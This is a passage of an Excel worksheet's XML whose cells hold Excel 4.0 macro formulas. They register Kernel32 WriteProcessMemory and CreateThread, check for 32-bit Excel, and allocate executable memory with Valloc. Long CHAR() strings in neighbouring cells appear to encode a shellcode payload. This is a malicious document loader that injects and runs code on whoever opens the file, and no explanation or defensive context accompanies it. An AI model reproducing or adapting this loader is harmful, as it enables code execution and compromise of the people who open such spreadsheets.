R(80)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(14)&amp;CHAR(164)&amp;CHAR(91)&amp;CHAR(6)&amp;CHAR(190)&amp;CHAR(197)&amp;CHAR(219)&amp;CHAR(140)&amp;CHAR(184)&amp;CHAR(18)&amp;CHAR(150)&amp;CHAR(212)&amp;CHAR(10)&amp;CHAR(151)&amp;CHAR(194)&amp;CHAR(56)&amp;CHAR(28)&amp;CHAR(147)&amp;CHAR(144)&amp;CHAR(164)&amp;CHAR(24)&amp;CHAR(184)&amp;CHAR(169)&amp;CHAR(125)&amp;CHAR(84)&amp;CHAR(229)&amp;CHAR(166)&amp;CHAR(76)&amp;CHAR(40)&amp;CHAR(204)&amp;CHAR(149)&amp;CHAR(55)&amp;CHAR(200)&amp;CHAR(156)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(142)&amp;CHAR(199)&amp;CHAR(129)&amp;CHAR(246)&amp;CHAR(92)&amp;CHAR(131)&amp;CHAR(241)&amp;CHAR(4)&amp;CHAR(162)&amp;CHAR(168)&amp;CHAR(168)&amp;CHAR(138)&amp;CHAR(176)&amp;CHAR(235)&amp;CHAR(94)&amp;CHAR(238)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(161)&amp;CHAR(64)&amp;CHAR(4)&amp;CHAR(139)&amp;CHAR(148)&amp;CHAR(238)&amp;CHAR(162)&amp;CHAR(211)&amp;CHAR(58)&amp;CHAR(196)&amp;CHAR(70)&amp;CHAR(58)&amp;CHAR(193)&amp;CHAR(44)&amp;CHAR(102)&amp;CHAR(247)&amp;CHAR(65)&amp;CHAR(252)&amp;CHAR(177)&amp;CHAR(79)&amp;CHAR(170)</f>
        <v>_x0008_r¤°_x0010__x001E_O8¨U'_x0011_1îp²_x001D_E¨gÆ&lt;ÛPc^_x001D_º_x001A_ši^(Ëuô;ï_x0011_ÐñÛå_x000C_˜O³Œc·-ÎÌ_x000B__x000F_ÇÀ)õ4ÊÌ\ku_x0008_ÙÙ_x0014_ñ±_x0017__x001D_ÛáƒbçH¼ì…›ñ_x0010_¹=&amp;_x0015_S M´_x000E_ô„.!gì"\åÂ_x0007_Oó_x001D_…ÔïVI'¥±[nüB–z=`í¿7_x001A_Ë|§aJÍ`aÂ¯j9›ÄL­Ï»Êž@(æRsK&gt;œ'Ž.ÙàÒÕgŽY\H¬4-PŽ¿_x000E_¤[_x0006_¾ÅÛŒ¸_x0012_–Ô
—Â8_x001C_“¤_x0018_¸©}Tå¦L(Ì•7Èœ_x0001_RŽÇö\ƒñ_x0004_¢¨¨Š°ë^î_x0014_f¡@_x0004_‹”î¢Ó:ÄF:Á,f÷Aü±Oª</v>
      </c>
      <c r="C6" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(119)&amp;CHAR(183)&amp;CHAR(82)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(97)&amp;CHAR(19)</f>
        <v>‘[ðw·RÁca_x0013_</v>
      </c>
    </row>
    <row r="7" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A7" t="b">
        <f>REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B7" t="str">
        <f>CHAR(231)&amp;CHAR(52)&amp;CHAR(255)&amp;CHAR(242)&amp;CHAR(112)&amp;CHAR(65)&amp;CHAR(255)&amp;CHAR(86)&amp;CHAR(38)&amp;CHAR(209)&amp;CHAR(94)&amp;CHAR(198)&amp;CHAR(105)&amp;CHAR(27)&amp;CHAR(183)&amp;CHAR(238)&amp;CHAR(108)&amp;CHAR(15)&amp;CHAR(137)&amp;CHAR(10)&amp;CHAR(242)&amp;CHAR(118)&amp;CHAR(108)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(120)&amp;CHAR(132)&amp;CHAR(224)&amp;CHAR(91)&amp;CHAR(212)&amp;CHAR(62)&amp;CHAR(76)&amp;CHAR(156)&amp;CHAR(97)&amp;CHAR(247)&amp;CHAR(60)&amp;CHAR(194)&amp;CHAR(182)&amp;CHAR(122)&amp;CHAR(158)&amp;CHAR(55)&amp;CHAR(217)&amp;CHAR(3)&amp;CHAR(120)&amp;CHAR(108)&amp;CHAR(4)&amp;CHAR(243)&amp;CHAR(8)&amp;CHAR(109)&amp;CHAR(10)&amp;CHAR(38)&amp;CHAR(232)&amp;CHAR(59)&amp;CHAR(103)&amp;CHAR(215)&amp;CHAR(218)&amp;CHAR(51)&amp;CHAR(86)&amp;CHAR(45)&amp;CHAR(87)&amp;CHAR(64)&amp;CHAR(28)&amp;CHAR(182)&amp;CHAR(79)&amp;CHAR(68)&amp;CHAR(39)&amp;CHAR(181)&amp;CHAR(102)&amp;CHAR(195)&amp;CHAR(195)&amp;CHAR(34)&amp;CHAR(185)&amp;CHAR(27)&amp;CHAR(124)&amp;CHAR(146)&amp;CHAR(119)&amp;CHAR(26)&amp;CHAR(189)&amp;CHAR(122)&amp;CHAR(87)&amp;CHAR(188)&amp;CHAR(249)&amp;CHAR(136)&amp;CHAR(30)&amp;CHAR(84)&amp;CHAR(92)&amp;CHAR(213)&amp;CHAR(97)&amp;CHAR(104)&amp;CHAR(26)&amp;CHAR(91)&amp;CHAR(214)&amp;CHAR(87)&amp;CHAR(133)&amp;CHAR(83)&amp;CHAR(153)&amp;CHAR(10)&amp;CHAR(96)&amp;CHAR(179)&amp;CHAR(247)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(145)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(176)&amp;CHAR(245)&amp;CHAR(7)&amp;CHAR(160)&amp;CHAR(169)&amp;CHAR(219)&amp;CHAR(247)&amp;CHAR(216)&amp;CHAR(202)&amp;CHAR(25)&amp;CHAR(181)&amp;CHAR(43)&amp;CHAR(117)&amp;CHAR(139)&amp;CHAR(96)&amp;CHAR(41)&amp;CHAR(2)&amp;CHAR(154)&amp;CHAR(84)&amp;CHAR(140)&amp;CHAR(131)&amp;CHAR(208)&amp;CHAR(23)&amp;CHAR(250)&amp;CHAR(83)&amp;CHAR(195)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(75)&amp;CHAR(64)&amp;CHAR(242)&amp;CHAR(68)&amp;CHAR(105)&amp;CHAR(210)&amp;CHAR(243)&amp;CHAR(217)&amp;CHAR(201)&amp;CHAR(173)&amp;CHAR(236)&amp;CHAR(95)&amp;CHAR(98)&amp;CHAR(199)&amp;CHAR(19)&amp;CHAR(184)&amp;CHAR(19)&amp;CHAR(180)&amp;CHAR(230)&amp;CHAR(104)&amp;CHAR(113)&amp;CHAR(94)&amp;CHAR(135)&amp;CHAR(93)&amp;CHAR(246)&amp;CHAR(88)&amp;CHAR(125)&amp;CHAR(22)&amp;CHAR(38)&amp;CHAR(211)&amp;CHAR(244)&amp;CHAR(143)&amp;CHAR(184)&amp;CHAR(238)&amp;CHAR(122)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(182)&amp;CHAR(62)&amp;CHAR(66)&amp;CHAR(125)&amp;CHAR(51)&amp;CHAR(189)&amp;CHAR(172)&amp;CHAR(239)&amp;CHAR(3)&amp;CHAR(59)&amp;CHAR(146)&amp;CHAR(63)&amp;CHAR(253)&amp;CHAR(131)&amp;CHAR(211)&amp;CHAR(217)&amp;CHAR(66)&amp;CHAR(235)&amp;CHAR(20)&amp;CHAR(98)&amp;CHAR(51)&amp;CHAR(180)&amp;CHAR(207)&amp;CHAR(195)&amp;CHAR(67)&amp;CHAR(254)&amp;CHAR(232)&amp;CHAR(8)&amp;CHAR(195)&amp;CHAR(221)&amp;CHAR(218)&amp;CHAR(157)&amp;CHAR(149)&amp;CHAR(43)&amp;CHAR(159)&amp;CHAR(79)&amp;CHAR(62)&amp;CHAR(204)&amp;CHAR(49)&amp;CHAR(7)&amp;CHAR(17)&amp;CHAR(103)&amp;CHAR(68)&amp;CHAR(207)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(140)&amp;CHAR(171)&amp;CHAR(175)&amp;CHAR(20)&amp;CHAR(205)&amp;CHAR(94)&amp;CHAR(76)&amp;CHAR(197)&amp;CHAR(3)&amp;CHAR(111)&amp;CHAR(177)&amp;CHAR(152)&amp;CHAR(161)&amp;CHAR(87)&amp;CHAR(147)&amp;CHAR(245)&amp;CHAR(116)&amp;CHAR(58)&amp;CHAR(139)&amp;CHAR(153)&amp;CHAR(244)&amp;CHAR(177)&amp;CHAR(42)&amp;CHAR(147)&amp;CHAR(117)&amp;CHAR(3)&amp;CHAR(182)&amp;CHAR(148)&amp;CHAR(140)&amp;CHAR(88)&amp;CHAR(16)&amp;CHAR(252)&amp;CHAR(217)&amp;CHAR(101)&amp;CHAR(202)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(89)&amp;CHAR(69)</f>
        <v>ç4ÿòpAÿV&amp;Ñ^Æi_x001B_·îl_x000F_‰
òvlR×x„à[Ô&gt;Lœa÷&lt;Â¶zž7Ù_x0003_xl_x0004_ó_x0008_m
&amp;è;g×Ú3V-W@_x001C_¶OD'µfÃÃ"¹_x001B_|’w_x001A_½zW¼ùˆ_x001E_T\Õah_x001A_[ÖW…S™
`³÷VV‘_x0002_³°õ_x0007_ ©Û÷ØÊ_x0019_µ+u‹`)_x0002_šTŒƒÐ_x0017_úSÃ_x0001_	K@òDiÒóÙÉ­ì_bÇ_x0013_¸_x0013_´æhq^‡]öX}_x0016_&amp;Óô¸îzÿá¶&gt;B}3½¬ï_x0003_;’?ýƒÓÙBë_x0014_b3´ÏÃCþè_x0008_ÃÝÚ•+ŸO&gt;Ì1_x0007__x0011_gDÏ_x0016_Œ«¯_x0014_Í^LÅ_x0003_o±˜¡W“õt:‹™ô±*“u_x0003_¶”ŒX_x0010_üÙeÊC!YE</v>
      </c>
      <c r="C7" t="str">
        <f>CHAR(53)&amp;CHAR(225)&amp;CHAR(122)&amp;CHAR(125)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(217)&amp;CHAR(214)&amp;CHAR(181)&amp;CHAR(30)</f>
        <v>5áz}ˆêÙÖµ_x001E_</v>
      </c>
    </row>
    <row r="8" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A8" t="b">
        <f>REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B8" t="str">
        <f>CHAR(188)&amp;CHAR(171)&amp;CHAR(224)&amp;CHAR(191)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(192)&amp;CHAR(7)&amp;CHAR(157)&amp;CHAR(197)&amp;CHAR(88)&amp;CHAR(69)&amp;CHAR(233)&amp;CHAR(183)&amp;CHAR(56)&amp;CHAR(216)&amp;CHAR(39)&amp;CHAR(65)&amp;CHAR(196)&amp;CHAR(187)&amp;CHAR(102)&amp;CHAR(5)&amp;CHAR(174)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(149)&amp;CHAR(122)&amp;CHAR(181)&amp;CHAR(100)&amp;CHAR(75)&amp;CHAR(53)&amp;CHAR(101)&amp;CHAR(230)&amp;CHAR(182)&amp;CHAR(131)&amp;CHAR(68)&amp;CHAR(232)&amp;CHAR(101)&amp;CHAR(99)&amp;CHAR(27)&amp;CHAR(89)&amp;CHAR(219)&amp;CHAR(182)&amp;CHAR(65)&amp;CHAR(123)&amp;CHAR(71)&amp;CHAR(235)&amp;CHAR(9)&amp;CHAR(123)&amp;CHAR(122)&amp;CHAR(22)&amp;CHAR(182)&amp;CHAR(195)&amp;CHAR(114)&amp;CHAR(109)&amp;CHAR(202)&amp;CHAR(41)&amp;CHAR(16)&amp;CHAR(247)&amp;CHAR(222)&amp;CHAR(210)&amp;CHAR(131)&amp;CHAR(76)&amp;CHAR(94)&amp;CHAR(126)&amp;CHAR(181)&amp;CHAR(60)&amp;CHAR(62)&amp;CHAR(163)&amp;CHAR(221)&amp;CHAR(25)&amp;CHAR(157)&amp;CHAR(46)&amp;CHAR(197)&amp;CHAR(87)&amp;CHAR(248)&amp;CHAR(129)&amp;CHAR(4)&amp;CHAR(58)&amp;CHAR(98)&amp;CHAR(55)&amp;CHAR(76)&amp;CHAR(168)&amp;CHAR(80)&amp;CHAR(124)&amp;CHAR(8)&amp;CHAR(245)&amp;CHAR(180)&amp;CHAR(156)&amp;CHAR(192)&amp;CHAR(57)&amp;CHAR(142)&amp;CHAR(29)&amp;CHAR(245)&amp;CHAR(29)&amp;CHAR(191)&amp;CHAR(13)&amp;CHAR(21)&amp;CHAR(156)&amp;CHAR(175)&amp;CHAR(237)&amp;CHAR(143)&amp;CHAR(174)&amp;CHAR(106)&amp;CHAR(26)&amp;CHAR(119)&amp;CHAR(176)&amp;CHAR(193)&amp;CHAR(242)&amp;CHAR(150)&amp;CHAR(97)&amp;CHAR(206)&amp;CHAR(153)&amp;CHAR(105)&amp;CHAR(84)&amp;CHAR(78)&amp;CHAR(172)&amp;CHAR(187)&amp;CHAR(236)&amp;CHAR(213)&amp;CHAR(96)&amp;CHAR(39)&amp;CHAR(114)&amp;CHAR(27)&amp;CHAR(126)&amp;CHAR(35)&amp;CHAR(192)&amp;CHAR(108)&amp;CHAR(245)&amp;CHAR(48)&amp;CHAR(179)&amp;CHAR(27)&amp;CHAR(102)&amp;CHAR(241)&amp;CHAR(103)&amp;CHAR(11)&amp;CHAR(210)&amp;CHAR(42)&amp;CHAR(219)&amp;CHAR(53)&amp;CHAR(107)&amp;CHAR(217)&amp;CHAR(38)&amp;CHAR(241)&amp;CHAR(8)&amp;CHAR(47)&amp;CHAR(54)&amp;CHAR(163)&amp;CHAR(252)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(249)&amp;CHAR(244)&amp;CHAR(202)&amp;CHAR(152)&amp;CHAR(137)&amp;CHAR(169)&amp;CHAR(223)&amp;CHAR(24)&amp;CHAR(119)&amp;CHAR(241)&amp;CHAR(135)&amp;CHAR(147)&amp;CHAR(21)&amp;CHAR(79)&amp;CHAR(125)&amp;CHAR(120)&amp;CHAR(42)&amp;CHAR(186)&amp;CHAR(186)&amp;CHAR(14)&amp;CHAR(166)&amp;CHAR(133)&amp;CHAR(29)&amp;CHAR(106)&amp;CHAR(251)&amp;CHAR(100)&amp;CHAR(243)&amp;CHAR(139)&amp;CHAR(184)&amp;CHAR(31)&amp;CHAR(50)&amp;CHAR(51)&amp;CHAR(179)&amp;CHAR(7)&amp;CHAR(139)&amp;CHAR(173)&amp;CHAR(105)&amp;CHAR(47)&amp;CHAR(192)&amp;CHAR(93)&amp;CHAR(67)&amp;CHAR(189)&amp;CHAR(40)&amp;CHAR(254)&amp;CHAR(190)&amp;CHAR(159)&amp;CHAR(72)&amp;CHAR(249)&amp;CHAR(137)&amp;CHAR(87)&amp;CHAR(72)&amp;CHAR(75)&amp;CHAR(123)&amp;CHAR(89)&amp;CHAR(124)&amp;CHAR(170)&amp;CHAR(173)&amp;CHAR(111)&amp;CHAR(66)&amp;CHAR(71)&amp;CHAR(81)&amp;CHAR(154)&amp;CHAR(200)&amp;CHAR(28)&amp;CHAR(253)&amp;CHAR(219)&amp;CHAR(126)&amp;CHAR(27)&amp;CHAR(96)&amp;CHAR(18)&amp;CHAR(115)&amp;CHAR(175)&amp;CHAR(185)&amp;CHAR(249)&amp;CHAR(122)&amp;CHAR(96)&amp;CHAR(40)&amp;CHAR(40)&amp;CHAR(255)&amp;CHAR(118)&amp;CHAR(236)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(202)&amp;CHAR(183)&amp;CHAR(252)&amp;CHAR(241)&amp;CHAR(190)&amp;CHAR(170)&amp;CHAR(176)&amp;CHAR(215)&amp;CHAR(229)&amp;CHAR(195)&amp;CHAR(61)&amp;CHAR(223)&amp;CHAR(41)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(210)&amp;CHAR(247)&amp;CHAR(74)&amp;CHAR(208)&amp;CHAR(94)&amp;CHAR(196)</f>
        <v>¼«à¿!ZÀ_x0007_ÅXEé·8Ø'AÄ»f_x0005_®_x0002_•zµdK5eæ¶ƒDèec_x001B_YÛ¶A{Gë	{z_x0016_¶ÃrmÊ)_x0010_÷ÞÒƒL^~µ&lt;&gt;£Ý_x0019_.ÅWø_x0004_:b7L¨P|_x0008_õ´œÀ9Ž_x001D_õ_x001D_¿_x000D__x0015_œ¯í®j_x001A_w°Áò–aÎ™iTN¬»ìÕ`'r_x001B_~#Àlõ0³_x001B_fñg_x000B_Ò*Û5kÙ&amp;ñ_x0008_/6£ü&gt;‚ùôÊ˜‰©ß_x0018_wñ‡“_x0015_O}x*ºº_x000E_¦…_x001D_jûdó‹¸_x001F_23³_x0007_‹­i/À]C½(þ¾ŸHù‰WHK{Y|ª­oBGQšÈ_x001C_ýÛ~_x001B_`_x0012_s¯¹ùz`((ÿvì„BÊ·üñ¾ª°×åÃ=ß)_x0007__x0003_Ò÷JÐ^Ä</v>
      </c>
      <c r="C8" t="str">
        <f>CHAR(119)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(2)&amp;CHAR(105)&amp;CHAR(95)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(75)</f>
        <v>wzˆ_x0002_i_¸ô9K</v>
      </c>
    </row>
    <row r="9" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A9" t="b">
        <f>IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(A10),GOTO(A21))</f>
        <v>0</v>
      </c>
      <c r="B9" t="str">
        <f>CHAR(1)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(226)&amp;CHAR(31)&amp;CHAR(75)&amp;CHAR(216)&amp;CHAR(191)&amp;CHAR(173)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(135)&amp;CHAR(193)&amp;CHAR(102)&amp;CHAR(10)&amp;CHAR(40)&amp;CHAR(1)&amp;CHAR(89)&amp;CHAR(88)&amp;CHAR(199)&amp;CHAR(96)&amp;CHAR(252)&amp;CHAR(17)&amp;CHAR(161)&amp;CHAR(46)&amp;CHAR(47)&amp;CHAR(132)&amp;CHAR(162)&amp;CHAR(81)&amp;CHAR(212)&amp;CHAR(61)&amp;CHAR(117)&amp;CHAR(255)&amp;CHAR(149)&amp;CHAR(48)&amp;CHAR(177)&amp;CHAR(34)&amp;CHAR(144)&amp;CHAR(149)&amp;CHAR(72)&amp;CHAR(9)&amp;CHAR(224)&amp;CHAR(200)&amp;CHAR(222)&amp;CHAR(209)&amp;CHAR(81)&amp;CHAR(45)&amp;CHAR(250)&amp;CHAR(26)&amp;CHAR(209)&amp;CHAR(229)&amp;CHAR(13)&amp;CHAR(115)&amp;CHAR(109)&amp;CHAR(83)&amp;CHAR(253)&amp;CHAR(31)&amp;CHAR(182)&amp;CHAR(199)&amp;CHAR(222)&amp;CHAR(121)&amp;CHAR(240)&amp;CHAR(250)&amp;CHAR(27)&amp;CHAR(106)&amp;CHAR(43)&amp;CHAR(105)&amp;CHAR(225)&amp;CHAR(232)&amp;CHAR(252)&amp;CHAR(116)&amp;CHAR(182)&amp;CHAR(42)&amp;CHAR(14)&amp;CHAR(250)&amp;CHAR(226)&amp;CHAR(4)&amp;CHAR(172)&amp;CHAR(150)&amp;CHAR(100)&amp;CHAR(76)&amp;CHAR(216)&amp;CHAR(197)&amp;CHAR(227)&amp;CHAR(180)&amp;CHAR(154)&amp;CHAR(140)&amp;CHAR(99)&amp;CHAR(188)&amp;CHAR(64)&amp;CHAR(100)&amp;CHAR(14)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(88)&amp;CHAR(22)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(140)&amp;CHAR(199)&amp;CHAR(182)&amp;CHAR(178)&amp;CHAR(69)&amp;CHAR(78)&amp;CHAR(193)&amp;CHAR(113)&amp;CHAR(250)&amp;CHAR(55)&amp;CHAR(49)&amp;CHAR(154)&amp;CHAR(3)&amp;CHAR(189)&amp;CHAR(192)&amp;CHAR(192)&amp;CHAR(92)&amp;CHAR(241)&amp;CHAR(160)&amp;CHAR(99)&amp;CHAR(193)&amp;CHAR(4)&amp;CHAR(171)&amp;CHAR(98)&amp;CHAR(48)&amp;CHAR(174)&amp;CHAR(99)&amp;CHAR(39)&amp;CHAR(182)&amp;CHAR(255)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(168)&amp;CHAR(76)&amp;CHAR(65)&amp;CHAR(235)&amp;CHAR(51)&amp;CHAR(44)&amp;CHAR(27)&amp;CHAR(71)&amp;CHAR(176)&amp;CHAR(245)&amp;CHAR(61)&amp;CHAR(220)&amp;CHAR(52)&amp;CHAR(239)&amp;CHAR(184)&amp;CHAR(87)&amp;CHAR(157)&amp;CHAR(160)&amp;CHAR(103)&amp;CHAR(5)&amp;CHAR(251)&amp;CHAR(225)&amp;CHAR(200)&amp;CHAR(240)&amp;CHAR(254)&amp;CHAR(31)&amp;CHAR(143)&amp;CHAR(13)&amp;CHAR(147)&amp;CHAR(85)&amp;CHAR(160)&amp;CHAR(14)&amp;CHAR(242)&amp;CHAR(61)&amp;CHAR(208)&amp;CHAR(206)&amp;CHAR(138)&amp;CHAR(15)&amp;CHAR(118)&amp;CHAR(181)&amp;CHAR(160)&amp;CHAR(192)&amp;CHAR(242)&amp;CHAR(245)&amp;CHAR(184)&amp;CHAR(4)&amp;CHAR(13)&amp;CHAR(55)&amp;CHAR(152)&amp;CHAR(160)&amp;CHAR(1)&amp;CHAR(220)&amp;CHAR(23)&amp;CHAR(32)&amp;CHAR(17)&amp;CHAR(179)&amp;CHAR(104)&amp;CHAR(124)&amp;CHAR(41)&amp;CHAR(5)&amp;CHAR(97)&amp;CHAR(167)&amp;CHAR(73)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(3)&amp;CHAR(139)&amp;CHAR(43)&amp;CHAR(118)&amp;CHAR(108)&amp;CHAR(78)&amp;CHAR(108)&amp;CHAR(155)&amp;CHAR(164)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(4)&amp;CHAR(195)&amp;CHAR(3)&amp;CHAR(17)&amp;CHAR(119)&amp;CHAR(224)&amp;CHAR(94)&amp;CHAR(220)&amp;CHAR(12)&amp;CHAR(74)&amp;CHAR(96)&amp;CHAR(186)&amp;CHAR(47)&amp;CHAR(250)&amp;CHAR(246)&amp;CHAR(133)&amp;CHAR(53)&amp;CHAR(219)&amp;CHAR(69)&amp;CHAR(86)&amp;CHAR(235)&amp;CHAR(212)&amp;CHAR(164)&amp;CHAR(107)&amp;CHAR(31)&amp;CHAR(242)&amp;CHAR(13)&amp;CHAR(197)&amp;CHAR(124)&amp;CHAR(103)&amp;CHAR(225)&amp;CHAR(156)&amp;CHAR(104)&amp;CHAR(246)&amp;CHAR(97)&amp;CHAR(138)&amp;CHAR(250)&amp;CHAR(219)&amp;CHAR(238)&amp;CHAR(95)&amp;CHAR(31)&amp;CHAR(127)&amp;CHAR(116)&amp;CHAR(115)&amp;CHAR(41)&amp;CHAR(193)&amp;CHAR(206)&amp;CHAR(22)</f>
        <v>_x0001_ôqâ_x001F_KØ¿­-_x0016_‡Áf
(_x0001_YXÇ`ü_x0011_¡./„¢QÔ=uÿ•0±"•H	àÈÞÑQ-ú_x001A_Ñå_x000D_smSý_x001F_¶ÇÞyðú_x001B_j+iáèüt¶*_x000E_úâ_x0004_¬–dLØÅã´šŒc¼@d_x000E__x0012_
X_x0016_-%ŒÇ¶²ENÁqú71š_x0003_½ÀÀ\ñ cÁ_x0004_«b0®c'¶ÿÌ_x0004_¨LAë3,_x001B_G°õ=Ü4ï¸W g_x0005_ûáÈðþ_x001F__x000D_“U _x000E_ò=ÐÎŠ_x000F_vµ Àòõ¸_x0004__x000D_7˜ _x0001_Ü_x0017_ _x0011_³h|)_x0005_a§I_x000B_Ë_x0003_‹+vlNl›¤9Â_x0004_Ã_x0003__x0011_wà^Ü_x000C_J`º/úö…5ÛEVëÔ¤k_x001F_ò_x000D_Å|gáœhöaŠúÛî__x001F_ts)ÁÎ_x0016_</v>
      </c>
      <c r="C9" t="str">
        <f>CHAR(65)&amp;CHAR(80)&amp;CHAR(145)&amp;CHAR(88)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(194)&amp;CHAR(136)&amp;CHAR(250)</f>
        <v>AP‘X¸ô0Âˆú</v>
      </c>
    </row>
    <row r="10" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A10" t="e">
        <f>Valloc(0,65536,4096,64)</f>
        <v>#NAME?</v>
      </c>
      <c r="B10" t="str">
        <f>CHAR(11)&amp;CHAR(168)&amp;CHAR(116)&amp;CHAR(162)&amp;CHAR(212)&amp;CHAR(73)&amp;CHAR(19)&amp;CHAR(30)&amp;CHAR(37)&amp;CHAR(158)&amp;CHAR(74)&amp;CHAR(121)&amp;CHAR(154)&amp;CHAR(50)&amp;CHAR(244)&amp;CHAR(98)&amp;CHAR(8)&amp;CHAR(23)&amp;CHAR(202)&amp;CHAR(179)&amp;CHAR(8)&amp;CHAR(122)&amp;CHAR(177)&amp;CHAR(104)&amp;CHAR(254)&amp;CHAR(9)&amp;CHAR(204)&amp;CHAR(160)&amp;CHAR(153)&amp;CHAR(171)&amp;CHAR(211)&amp;CHAR(231)&amp;CHAR(186)&amp;CHAR(214)&amp;CHAR(114)&amp;CHAR(218)&amp;CHAR(164)&amp;CHAR(172)&amp;CHAR(57)&amp;CHAR(167)&amp;CHAR(139)&amp;CHAR(60)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(86)&amp;CHAR(101)&amp;CHAR(220)&amp;CHAR(43)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(28)&amp;CHAR(64)&amp;CHAR(32)&amp;CHAR(116)&amp;CHAR(72)&amp;CHAR(198)&amp;CHAR(145)&amp;CHAR(62)&amp;CHAR(90)&amp;CHAR(118)&amp;CHAR(196)&amp;CHAR(121)&amp;CHAR(252)&amp;CHAR(109)&amp;CHAR(133)&amp;CHAR(97)&amp;CHAR(185)&amp;CHAR(206)&amp;CHAR(117)&amp;CHAR(8)&amp;CHAR(195)&amp;CHAR(126)&amp;CHAR(93)&amp;CHAR(75)&amp;CHAR(143)&amp;CHAR(21)&amp;CHAR(166)&amp;CHAR(211)&amp;CHAR(119)&amp;CHAR(142)&amp;CHAR(161)&amp;CHAR(51)&amp;CHAR(134)&amp;CHAR(103)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(38)&amp;CHAR(232)&amp;CHAR(150)&amp;CHAR(89)&amp;CHAR(199)&amp;CHAR(173)&amp;CHAR(247)&amp;CHAR(222)&amp;CHAR(149)&amp;CHAR(220)&amp;CHAR(173)&amp;CHAR(118)&amp;CHAR(5)&amp;CHAR(79)&amp;CHAR(234)&amp;CHAR(136)&amp;CHAR(84)&amp;CHAR(104)&amp;CHAR(155)&amp;CHAR(207)&amp;CHAR(179)&amp;CHAR(177)&amp;CHAR(93)&amp;CHAR(12)&amp;CHAR(145)&amp;CHAR(11)&amp;CHAR(177)&amp;CHAR(163)&amp;CHAR(39)&amp;CHAR(118)&amp;CHAR(99)&amp;CHAR(83)&amp;CHAR(232)&amp;CHAR(115)&amp;CHAR(184)&amp;CHAR(204)&amp;CHAR(35)&amp;CHAR(222)&amp;CHAR(169)&amp;CHAR(43)&amp;CHAR(169)&amp;CHAR(211)&amp;CHAR(29)&amp;CHAR(231)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(234)&amp;CHAR(190)&amp;CHAR(22)&amp;CHAR(89)&amp;CHAR(67)&amp;CHAR(103)&amp;CHAR(117)&amp;CHAR(227)&amp;CHAR(167)&amp;CHAR(165)&amp;CHAR(72)&amp;CHAR(239)&amp;CHAR(57)&amp;CHAR(215)&amp;CHAR(130)&amp;CHAR(105)&amp;CHAR(137)&amp;CHAR(110)&amp;CHAR(17)&amp;CHAR(56)&amp;CHAR(117)&amp;CHAR(248)&amp;CHAR(144)&amp;CHAR(182)&amp;CHAR(249)&amp;CHAR(221)&amp;CHAR(130)&amp;CHAR(88)&amp;CHAR(139)&amp;CHAR(255)&amp;CHAR(27)&amp;CHAR(12)&amp;CHAR(139)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(215)&amp;CHAR(239)&amp;CHAR(195)&amp;CHAR(228)&amp;CHAR(79)&amp;CHAR(146)&amp;CHAR(24)&amp;CHAR(254)&amp;CHAR(56)&amp;CHAR(132)&amp;CHAR(39)&amp;CHAR(137)&amp;CHAR(71)&amp;CHAR(144)&amp;CHAR(152)&amp;CHAR(154)&amp;CHAR(131)&amp;CHAR(3)&amp;CHAR(244)&amp;CHAR(209)&amp;CHAR(171)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(66)&amp;CHAR(201)&amp;CHAR(201)&amp;CHAR(234)&amp;CHAR(56)&amp;CHAR(25)&amp;CHAR(194)&amp;CHAR(92)&amp;CHAR(77)&amp;CHAR(219)&amp;CHAR(34)&amp;CHAR(96)&amp;CHAR(115)&amp;CHAR(158)&amp;CHAR(249)&amp;CHAR(156)&amp;CHAR(18)&amp;CHAR(13)&amp;CHAR(81)&amp;CHAR(227)&amp;CHAR(99)&amp;CHAR(13)&amp;CHAR(254)&amp;CHAR(242)&amp;CHAR(150)&amp;CHAR(186)&amp;CHAR(70)&amp;CHAR(104)&amp;CHAR(216)&amp;CHAR(93)&amp;CHAR(254)&amp;CHAR(102)&amp;CHAR(109)&amp;CHAR(74)&amp;CHAR(128)&amp;CHAR(79)&amp;CHAR(57)&amp;CHAR(234)&amp;CHAR(13)&amp;CHAR(127)&amp;CHAR(17)&amp;CHAR(1)&amp;CHAR(39)&amp;CHAR(61)&amp;CHAR(231)&amp;CHA